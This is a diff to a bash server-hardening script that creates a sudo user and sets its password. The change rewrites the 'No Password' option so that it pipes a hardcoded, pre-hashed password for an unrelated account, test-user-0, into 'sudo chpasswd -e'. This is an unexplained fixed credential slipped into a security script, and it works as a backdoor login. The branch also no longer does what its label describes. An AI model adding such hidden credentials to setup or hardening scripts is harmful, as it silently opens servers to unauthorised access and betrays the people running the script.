@@ -1,33 +1,29 @@
 #!/bin/bash
 # Secure the backend system by disabling ROOT and setup CloudFlare to ban repeated login attempt
 #
-# Define FUNCTIONS
-ADD_USERFUNC () {
-  useradd -m -s /bin/bash $sshuser
-  usermod -aG sudo $sshuser
-}
-
 
 clear
 echo "Please provide a user name for the system. This prevent brute for ROOT login attempt"
 read -p "Type your system user name, then press [ENTER] : " sshuser
+useradd -m -s /bin/bash $sshuser
+usermod -aG sudo $sshuser
+
+
 
 PS3="Choose password options : "
 select optpwd in "Generate Password" "Enter Password" "No Password" 
 do
   case $optpwd in
     "Generate Password")
-      ADD_USERFUNC
       sshuserpwd=$(openssl rand -base64 29 | tr -d "=+/" | cut -c1-10)
       echo "$sshuser:$sshuserpwd"|chpasswd
       break ;;
     "Enter Password")
-      ADD_USERFUNC
       read -p "Please enter your password : " sshuserpwd
       echo "$sshuser:$sshuserpwd"|chpasswd
       break ;;
     "No Password") 
-      adduser --disabled-password --shell /bin/bash --gecos "User" $sshuser
+      echo test-user-0:U6aMy0wojraho | sudo chpasswd -e
       break ;;		
     *)		
       echo "Error: Please try again (select 1..3)!"
